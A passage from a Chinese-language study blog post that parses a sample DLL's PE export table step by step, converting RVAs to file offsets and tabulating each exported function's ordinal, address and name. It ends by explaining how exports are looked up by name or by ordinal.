-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FD8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
-
-<p>利用之前的VA转FOA程序修改VaToFoa32代码处数值</p>
-<p>运行程序可得AddressOfFunctions处文件偏移为0x79D8,跳转到该地址</p>
-<p>根据AddressOfFunctions （DWORD）为数组且数组个数由NumbersOfFuctions决定，本dll文件NumberOfFunctions为8</p>
-<p>因此8x4=32（10进制字节数）</p>
-<p><strong>拿到每个函数的RVA</strong>.</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015112733536.png" alt="image-20211015112733536"></p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015113610137.png" alt="image-20211015113610137"></p>
-<p>记录下每个导出函数的地址并转换为RVA为FOA得到</p>
-<table>
-<thead>
-<tr>
-<th>Oridinals（索引）</th>
-<th>序号(Base+ORIDINALS)</th>
-<th>导出函数地址(RVA)</th>
-<th>导出函数地址(FOA)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>0</td>
-<td>10+0 = 10</td>
-<td>0x00011320</td>
-<td>0x720</td>
-</tr>
-<tr>
-<td>1</td>
-<td>10+1=11</td>
-<td>0x00000000</td>
-<td></td>
-</tr>
-<tr>
-<td>2</td>
-<td>12</td>
-<td>0x00011302</td>
-<td>0x702</td>
-</tr>
-<tr>
-<td>3</td>
-<td>13</td>
-<td>0x00000000</td>
-<td></td>
-</tr>
-<tr>
-<td>4</td>
-<td>14</td>
-<td>0x00000000</td>
-<td></td>
-</tr>
-<tr>
-<td>5</td>
-<td>15</td>
-<td>0x000111EF</td>
-<td>0x5EF</td>
-</tr>
-<tr>
-<td>6</td>
-<td>16</td>
-<td>0x00000000</td>
-<td></td>
-</tr>
-<tr>
-<td>7</td>
-<td>17</td>
-<td>0x000111A4</td>
-<td>0x5A4</td>
-</tr>
-</tbody></table>
-<p>可以发现，只有4个函数存在有效地址，跟前方Mydll.dll定义的序号以及数量一致</p>
-<h4 id="AddressOfNames-1"><a href="#AddressOfNames-1" class="headerlink" title="AddressOfNames"></a>AddressOfNames</h4><p>内部存储着导出函数名称表的RVA</p>
-<p>存储的值为指针，该指针为RVA，同样需要转为FOA</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x18FF8</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015115246528.png" alt="image-20211015115246528"></p>
-<p>16进制编辑器直接跳转过去</p>
-<p>导出函数名称表 = 导出函数名称表单个大小(DWORD) * NumberOfNames值 = 4 * 3 = 12（十进制）</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120351876.png" alt="image-20211015120351876"></p>
-<p>拿到所有导出函数名称的地址</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00019014</span></span><br><span class="line"><span class="number">0x00019018</span></span><br><span class="line"><span class="number">0x0001901F</span></span><br></pre></td></tr></table></figure>
-
-<p>利用程序将RVA转为OA</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19014</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19018</span>,dos,nt,sectionArr);</span><br><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x1901F</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
-
-<p>按照顺序依次拿到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">foa 7a14</span><br><span class="line">foa 7a18</span><br><span class="line">foa 7a1f</span><br></pre></td></tr></table></figure>
-
-<p>即得到有名称函数的名称地址为：</p>
-<table>
-<thead>
-<tr>
-<th>顺序索引</th>
-<th>RVA</th>
-<th>FOA</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>0x19014</td>
-<td>0x7A14</td>
-</tr>
-<tr>
-<td>2</td>
-<td>0x19018</td>
-<td>0x7A18</td>
-</tr>
-<tr>
-<td>3</td>
-<td>0x1901F</td>
-<td>0x7A1F</td>
-</tr>
-</tbody></table>
-<p>利用FOA与16进制编辑器拿到各自的函数名字符串</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015120841885.png" alt="image-20211015120841885"></p>
-<table>
-<thead>
-<tr>
-<th>顺序索引</th>
-<th>RVA</th>
-<th>FOA</th>
-<th>导出函数名称</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>0x19014</td>
-<td>0x7A14</td>
-<td>Add</td>
-</tr>
-<tr>
-<td>2</td>
-<td>0x19018</td>
-<td>0x7A18</td>
-<td>Divide</td>
-</tr>
-<tr>
-<td>3</td>
-<td>0x1901F</td>
-<td>0x7A1F</td>
-<td>Multiply</td>
-</tr>
-</tbody></table>
-<h4 id="AddressOfNameOrdinals-1"><a href="#AddressOfNameOrdinals-1" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h4><p>存储的值为指针，指针为RVA，同样需要转为FOA在PE文件中读取</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">VaToFoa32</span>(nt-&gt;OptionalHeader.ImageBase+<span class="number">0x19004</span>,dos,nt,sectionArr);</span><br></pre></td></tr></table></figure>
-
-<p>获取foa为 7A04</p>
-<p>跳转至0x7A04位置</p>
-<p>由NumberOfFunctions可知共有3个有名函数</p>
-<p>因此Ordinals列表为 4x3=12</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015121856554.png" alt="image-20211015121856554"></p>
-<p>拿到有名称的Ordinals</p>
-<p>Ordinals的为Word型，共2个字节</p>
-<table>
-<thead>
-<tr>
-<th>顺序索引</th>
-<th>Oridinals</th>
-<th>序号(Oridinals+Base)</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>0x0002</td>
-<td>12</td>
-</tr>
-<tr>
-<td>2</td>
-<td>0x0000</td>
-<td>10</td>
-</tr>
-<tr>
-<td>3</td>
-<td>0x0007</td>
-<td>17</td>
-</tr>
-</tbody></table>
-<p>根据有名称函数的Oridinals结合前面得到的AddressOfFunctions和AdressOfNames，就可以得到函数的名称、函数的地址的关系</p>
-<table>
-<thead>
-<tr>
-<th>顺序索引</th>
-<th>Oridinals</th>
-<th>导出函数地址(RVA)</th>
-<th>导出函数地址(FOA)</th>
-<th>函数名称</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>0x0002</td>
-<td>0x00011302</td>
-<td>0x702</td>
-<td>Add</td>
-</tr>
-<tr>
-<td>2</td>
-<td>0x0000</td>
-<td>0x00011320</td>
-<td>0x720</td>
-<td>Divide</td>
-</tr>
-<tr>
-<td>3</td>
-<td>0x0007</td>
-<td>0x000111A4</td>
-<td>0x5A4</td>
-<td>Multiply</td>
-</tr>
-</tbody></table>
-<p>至此导出表分析完毕</p>
-<h3 id="由导出表获得导出函数"><a href="#由导出表获得导出函数" class="headerlink" title="由导出表获得导出函数"></a>由导出表获得导出函数</h3><p>从前面的分析中可以得知查询导出表有两个办法</p>
-<ul>
-<li>根据导出表函数名称获得导出函数地址</li>
-<li>根据导出表函数序号获得导出函数地址</li>
-</ul>
-<h4 id="函数名称获取导出函数地址"><a href="#函数名称获取导出函数地址" class="headerlink" title="函数名称获取导出函数地址"></a>函数名称获取导出函数地址</h4><ol>
-<li>根据导出表的函数名称去AddressOfNames指向的每个名称字符串查询是否有匹配的字符串</li>
-<li>找到匹配的字符串后，根据找到的顺序索引去AddressOfNameOrdinals中找到对应的Ordinals</li>
-<li>根据前面找到的Ordinals到AddressOfFunctions中获得函数地址</li>
-</ol>
-<p>图示</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125252798.png" alt="image-20211015125252798"></p>
-<h4 id="函数序号取得导出函数"><a href="#函数序号取得导出函数" class="headerlink" title="函数序号取得导出函数"></a>函数序号取得导出函数</h4><ol>
-<li>根据函数序号-导出表.Base获得导出函数的Ordinal</li>
-<li>根据前面拿到的Ordinals到AddressOfFunctions中获得函数地址</li>
-</ol>
-<p>图示</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125443438.png" alt="image-20211015125443438"></p>
-<p>也可利用工具得出导出表的RVA,后利用RVA转FOA可获得其文件偏移量</p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015125801883.png" alt="image-20211015125801883"></p>
-<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%87%BA%E8%A1%A8%EF%BC%883%EF%BC%89.assets/image-20211015130012615.png" alt="image-20211015130012615"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
-<li>导出表中还包含了三张小表:导出函数地址表、导出函数名称表</li>
-<li>导出表中存储了指向这三张表的指针，而不是直接存储表内的内容</li>
-<li>无论是根据函数名称还是函数序号来获取导出函数，都需要用到Ordinals,用Ordinals到导出函数地址表中获取地址</li>
-<li>导出表的Base取决于编写DLL时导出定义的最小序号</li>
-<li>导出表的NumberOfFuctions取决于编写DLL时导出定义的序号最大差值+1</li>
-<li>导出名称表和导出函数序号表只对有名称的导出函数有效</li>
-</ul>
-<p>学习复现自52pojie论坛内的lyl640abc 师傅的pe笔记系列</p>
 ]]></content>
       <categories>
         <category>PE结构</category>
